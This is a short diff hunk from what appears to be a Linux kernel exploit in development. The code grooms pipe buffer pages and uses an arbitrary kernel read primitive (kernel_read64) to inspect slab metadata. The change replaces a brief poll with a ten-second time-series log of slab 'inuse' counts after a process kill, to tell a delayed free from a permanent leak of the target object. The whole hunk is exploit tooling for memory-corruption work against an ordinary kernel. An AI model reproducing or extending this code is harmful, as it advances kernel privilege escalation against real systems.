@@ -636,10 +636,21 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
          * (groom) and its first tsc read -- this reproduces that gap at
          * the batch boundary.  Reads here are page-descriptor only
          * (proven safe); never derived pointers. */
-        for (int r = 0; r < 3; r++) {
-          if (read_target_slab_cache(conv_fd, base) == 0)
+        /* inuse time-series after the serial kill: distinguishes a
+         * DELAYED free (scanner/mm_count holder releases within seconds
+         * -> inuse drops 34->0 at some tick => find the window) from a
+         * PERMANENT leak (inuse stuck 34 for the whole 10s => mm never
+         * freed).  Reads are page-descriptor only (proven safe). */
+        for (int r = 0; r < 11; r++) {
+          uintptr_t hd = direct_to_head_page(conv_fd, base);
+          uint64_t w28 = hd ? kernel_read64(conv_fd, hd + 0x28) : 1;
+          uint64_t w20 = hd ? kernel_read64(conv_fd, hd + 0x20) : 0;
+          pr_info("pipe killpoll w=%d t=%dms inuse=%u +20=%016llx hd=%d\n",
+                  w, r * 1000, (unsigned)(w28 & 0xffffu),
+                  (unsigned long long)w20, hd ? 1 : 0);
+          if (!hd || (w28 & 0xffffu) == 0)
             break;
-          usleep(100000);
+          usleep(1000000);
         }
         {
           uint64_t t2 = read_target_slab_cache(conv_fd, base);
